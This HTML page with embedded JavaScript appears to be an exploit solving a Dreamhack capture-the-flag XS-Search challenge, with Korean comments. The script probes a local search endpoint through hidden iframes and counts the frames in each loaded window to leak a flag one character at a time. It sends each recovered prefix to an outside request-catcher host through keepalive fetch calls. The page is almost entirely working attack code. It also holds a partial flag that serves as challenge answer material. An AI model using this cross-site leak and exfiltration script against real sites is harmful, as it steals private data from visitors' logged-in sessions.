<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h1>XS-Search Site</h1>

<script>
    const chars = "abcdefghijklmnopqrstuvwxyz0123456789_}";
    let flag = "DH{22d1445ad68e1"; // 마지막으로 찾은 부분부터 시작

    async function searchChar(data) {
        return new Promise((resolve) => {
            const ifr = document.createElement('iframe');
            ifr.style.display = 'none';
            
            // 봇이 죽기 전에 강제 해제 (250ms 응답 없으면 바로 다음 글자로)
            const timer = setTimeout(() => {
                if(document.body.contains(ifr)) document.body.removeChild(ifr);
                resolve(false);
            }, 250);

            ifr.onload = () => {
                clearTimeout(timer);
                const found = ifr.contentWindow.frames.length > 0;
                document.body.removeChild(ifr);
                resolve(found);
            };
            
            ifr.src = `http://127.0.0.1:8000/search?query=${encodeURIComponent(data)}`;
            document.body.appendChild(ifr);
        });
    }

    async function findFlag() {
        // fetch keepalive를 사용하면 봇이 종료되어도 요청이 끝까지 전달됩니다.
        const report = (f) => fetch(`https://krxnknf.request.dreamhack.games?found=${encodeURIComponent(f)}`, {keepalive: true, mode: 'no-cors'});
        
        report('started');

        for (let i = 0; i < 30; i++) {
            let foundAny = false;
            for (let c of chars) {
                if (await searchChar(flag + c)) {
                    flag += c;
                    report(flag); // 찾자마자 즉시 전송
                    foundAny = true;
                    if (c === "}") return;
                    break;
                }
            }
            if (!foundAny) break;
        }
    }
    findFlag();
</script>
</body>
</html>
